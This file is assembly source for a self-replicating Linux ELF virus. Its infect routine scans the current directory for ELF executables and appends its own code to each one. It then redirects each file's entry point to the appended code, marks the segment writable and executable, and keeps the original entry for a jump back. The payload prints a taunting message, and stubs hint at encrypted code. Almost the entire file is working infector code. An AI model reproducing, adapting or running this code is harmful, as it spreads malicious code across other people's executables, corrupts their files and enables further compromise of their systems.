[bits 64]
section .text
global start
org 0x08048000

elf_header:                                      ; Elf32_elf_header
	db 0x7F,"ELF" ;   e_ident  >>>
	db  2, 1, 1, 0
cave_start:
;	mov al, byte [rsi+30]
;	xor byte [rsi], al
;	inc rsi
;loop cavecode
;	call rsi
	call infect ; temporary
	ret
cave_end:
;	times 12 - (cave_end - cave_start) db 'A'	; we need bytes for padding, the code cave here is 12 bytes long
	times 8 - (cave_end - cave_start) db 'A'	; we need bytes for padding, the code cave here is 12 bytes long
	; e_ident <<<
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	dw 2                               ;   e_type	18
e_machine:
	dw 62                              ;   e_machine	20
	dd 1                               ;   e_version	24
e_entry:
	dq code                          ;   e_entry		32
e_phoff:
	dq program_header - $$             ;   e_phoff
	dq 0                               ;   e_shoff
	dd 0                               ;   e_flags
	dw elf_headersize                  ;   e_ehsize
	dw program_headersize              ;   e_phentsize
	dw 1                               ;   e_phnum
	dw 0                               ;   e_shentsize
	dw 0                               ;   e_shnum
	dw 0                               ;   e_shstrndx
elf_header_end:
	elf_headersize equ $ - elf_header

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
program_header:                        ; Elf64_program_header
	dd 1                               ;   p_type	4
	dd 0x7                             ;   p_flags	8
	dq 0                               ;   p_offset	16
	dq $$                              ;   p_vaddr	24
	dq $$                              ;   p_paddr	32
	dq infection_size                  ;   p_filesz
	dq infection_size                  ;   p_memsz
	dq 0x1000                          ;   p_align
	program_headersize equ $ - program_header

code:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor rax, rax
	mov rcx, code - infect
	mov rsi, infect
	call $$ + cave_start - elf_header

;;;;;;;;;  insert evil here  ;;;;;;;;;;;
	call qword stub
	jmp bottom
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; encrypted code:
open:
	xor rax, rax
	mov al, 2
	syscall
	ret
read:
	xor rax, rax
	lea rsi, [r15]
	syscall
	ret
write:
	xor rax, rax
	mov al, 1
	syscall
	ret
seek:
	xor rax, rax
	mov al, 8
	mov rdx, 0
	syscall
	ret
fstat:
	xor rax, rax
	mov al, 5
	lea rsi, [r15]
	syscall
	ret
infect:
; find an executable
	mov rdi, dirstr  ; fd = open(".", O_RDONLY | O_DIRECTORY, 0);
	mov rsi, 0x10000
	xor rdx, rdx
	call open
	mov r8, rax		;* fd -> r8
	cmp rax, -1		; if(fd == -1)
	jne dir_continue
	ret				; return;
	
dir_continue:
	xor rax, rax	; char* buf=(char*)sbrk(1024);
	mov al, 12
	xor rdi, rdi	; 		//end=brk(0) <- get the current end value
	syscall
	lea r9, [rax]
	
	xor rax, rax
	mov al, 12
	lea rdi, [r9+1174]	; 		//brk(end+1174) <- allocate program memory
	syscall
	lea r9, [rax]	;*	buf -> r9
	lea r15, [r9+1032]

	xor rax, rax	; 	nread = syscall(SYS_getdents, fd, buf, sizeof(buf));
	mov al, 78
	mov rdi, r8
	mov rsi, r9
	mov rdx, 1032
	syscall
	mov r10, rax		;*	nread -> r10
	cmp rax, -1			; 	if(nread == -1)
	jne dir_loop_prepare
	ret					; 		return;
dir_loop_prepare:
	xor r13, r13		;*  bpos -> r13
dir_loop:				; 	do {
	lea r12, [r9+r13]	;*		dent* d = (struct linux_dirent *) (buf + bpos);
	;;;;;;;;;;;;;;;
	; d_ino: 0
	; d_off: 8
	; d_reclen: 16
	; d_name: 18
	;;;;;;;;;;;;;;;
					  
	movzx rax, byte [r12+16]	; int d_type = *(buf + bpos + d->d_reclen - 1);
	dec rax
	movzx r14, byte [rax+r12]
	cmp r14b, 8					; if(d_type != DT_REG)
	jne nope					; 	goto nope;
								; else
	lea rdi, [r12+18]		;	f = open(name,O_RDRW,0)
	mov rsi, 2
	xor rdx, rdx
	call open
	mov r8, rax
	
	mov rdi, r8			;	read(f, fbuf, 4);
	mov rdx, 4
	call read
	
	cmp dword [r15], 0x464c457f	; if(fbuf[0]==0x7f&&fbuf[1]=='E'&&fbuf[2]=='L'&&fbuf[3]=='F')
	jne nope					;	continue;
								; else
	; write up to e_entry from header
	mov rdi, r8
	mov rsi, 4
	call seek
	
	mov rdi, r8			;	write(f, elf_header+4, 20);
	lea rsi, [$$+4]
	mov rdx, 20
	call write
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	; read e_entry into r15
	mov rdi, r8			;	read(f, fbuf, 8);
	mov rdx, 8
	call read
	push qword [r15]	; push the original address for real_entry jmp
	
	; read file size so we know where to put our code
	mov rdi, r8
	call fstat

	; write code body to end of file
	mov rdi, r8
	mov rsi, qword [r15+48]
	call seek
	
	mov rdi, r8			;	write(f, code, code_size);
	lea rsi, [code]
	mov rdx, code_size
	call write
	
	; restore old entry point and modify real_entry rop to reflect this
	mov rdi, r8
	mov rax, qword [r15+48]
	lea rsi, [code_size+rax]
	sub rsi, 5
	call seek
	
	mov rdi, r8			;	write(f, elf_header+4, 20);
	pop rsi	; pop real address
	mov [r15], rsi
	lea rsi, [r15]
	mov rdx, 4
	call write
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	; seek back and write new entry point  filesize - codesize + vaddr
	mov rdi, r8
	mov rsi, 24
	call seek
	
	mov rdi, r8
	call fstat
	push qword [r15+48]
	
	mov rdi, r8			;	write(f, elf_header+4, 20);	
	pop rax
;	sub rax, code_size
	add rax, 0x400200
	mov qword [r15], rax
	lea rsi, [r15]
	mov rdx, 8
	call write
;	
	; read in program header location and write new flags for self modification
	mov rdi, r8
	mov rsi, 32
	call seek
	
	mov rdi, r8			;	read(f, fbuf, 4);
	mov rdx, 4
	call read

	mov rdi, r8
	movzx rsi, word [r15]
	add rsi, 4
	call seek
	
	mov rdi, r8			;	write(f, elf_header+4, 20);
	mov rax, qword [$$+32]
	lea rsi, [rax+4]
	mov rdx, 4
	call write
	
	; write new size values for filesize and memsize
	mov rdi, r8			;	read(f, fbuf, 24);
	mov rdx, 32
	call read
	
	mov rdi, r8
	call fstat
	
	mov rdi, r8			;	write(f, elf_header+4, 20);
	mov rax, qword [r15+48]
	add rax, code_size
	mov qword [r15], rax
	lea rsi, [r15]
	mov rdx, 8
	call write
	
	mov rdi, r8
	call fstat
	
	mov rdi, r8			;	write(f, elf_header+4, 20);
	mov rax, qword [r15+48]
	add rax, code_size
	mov qword [r15], rax
	lea rsi, [r15]
	mov rdx, 8
	call write


;;;;;;;;;;;just for debug;;;;;;;;;;;;;;
;	lea rsi, [r12+18]
;	call strlen
;	mov rdx, rax
;	xor rax, rax
;	xor rdi, rdi
;	mov al, 0x1
;	mov dil, al
;	syscall
;
;	lea rsi, [hi+5]
;	call strlen
;	lea rsi, [rsi+rax-1]
;	xor rax, rax
;	xor rdi, rdi
;	mov al, 0x1
;	mov rdx, 1
;	mov dil, al
;	syscall
;;;;;;;;;;;;;;;;;;;;;;;;;
	xor rax, rax		;	close(f);
	mov al, 3
	mov rdi, r8
	syscall
nope:
	movzx rax, word [r12+16] ;	 	bpos += d->d_reclen;
	add r13, rax
	cmp r13, r10			 ;	} while(bpos < nread);
	jl dir_loop
	ret

dirstr:
	db ".",0

stub:
	jmp hi
main:
	pop rsi
	xor rax, rax	; clear out registers
	xor rdx, rdx
	xor rdi, rdi
	mov al, 0x1		; write stuff to stdout
	mov dil, al
	mov dl, 93
	syscall
	ret
hi:
	call main
	db 0xa,"Do you know what you have just unleashed dude?",0xa,"I hope this was in a seperate test folder...", 0xa,0
bottom:
	push exit
	ret



code_size equ $ - code



infection_size equ $ - $$

strlen:
	xor rcx, rcx
len:
	mov bl, byte [rsi+rcx]
	inc rcx
	cmp bl,0
	jne len
	dec rcx
	mov rax, rcx
	ret
exit:
	xor rax, rax
	mov al, 60		; exit
	xor rdi, rdi
	syscall	


